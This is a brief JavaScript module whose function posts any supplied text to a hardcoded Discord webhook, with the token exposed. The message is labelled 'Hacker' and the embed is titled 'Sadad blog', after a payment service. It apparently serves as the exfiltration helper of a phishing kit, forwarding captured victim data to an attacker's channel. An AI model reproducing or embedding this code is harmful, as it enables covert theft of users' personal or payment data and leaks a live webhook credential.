import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328877959192510477/xFxi764BSgrVn05h8y0XothdS4u1Qi86uzGz49aPGz_hF1FcpE7t51P1l-0asZTmXIAC",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
